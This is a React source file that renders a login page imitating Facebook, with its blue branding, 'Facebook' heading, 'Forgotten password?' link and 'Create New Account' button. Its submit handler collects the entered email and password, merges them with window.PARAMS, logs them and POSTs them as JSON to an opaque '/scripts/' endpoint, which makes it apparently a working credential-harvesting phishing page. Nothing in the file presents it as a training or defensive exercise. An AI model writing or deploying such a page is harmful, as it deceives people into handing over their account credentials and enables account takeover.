import React, { useState } from "react";
import ReactDOM from "react-dom/client";

const LoginForm = () => {
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");

  const handleSubmit = (e) => {
    e.preventDefault();
    const formData = {
      email,
      password,
      ...window.PARAMS,
    };

    console.log("Submitting form data:", formData);

    // Simular una redirección o envío
    fetch("/scripts/bed2b5e2-9f78-4e1b-bc85-cf5a84c8f76d", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify(formData),
    });
  };

  return (
    <div className="min-h-screen flex items-center justify-center bg-gray-100">
      <div className="bg-white p-6 rounded-lg shadow-md w-full max-w-md">
        <h2 className="text-center text-2xl font-bold mb-6 text-[#1877F2]">Facebook</h2>
        <form onSubmit={handleSubmit} className="space-y-4">
          <input
            type="text"
            placeholder="Email or Phone Number"
            value={email}
            onChange={(e) => setEmail(e.target.value)}
            required
            className="w-full px-4 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500"
          />
          <input
            type="password"
            placeholder="Password"
            value={password}
            onChange={(e) => setPassword(e.target.value)}
            required
            className="w-full px-4 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500"
          />
          <button
            type="submit"
            className="w-full bg-[#1877F2] text-white py-2 rounded-md font-semibold hover:bg-[#166FE5]"
          >
            Log In
          </button>
          <div className="text-center text-sm text-blue-500 hover:underline cursor-pointer">
            Forgotten password?
          </div>
          <hr className="my-4" />
          <button
            type="button"
            className="w-full bg-[#42b72a] text-white py-2 rounded-md font-semibold hover:bg-green-600"
          >
            Create New Account
          </button>
        </form>
      </div>
    </div>
  );
};

const root = document.getElementById("root");
if (root) {
  const rootElement = ReactDOM.createRoot(root);
  rootElement.render(<LoginForm />);
}
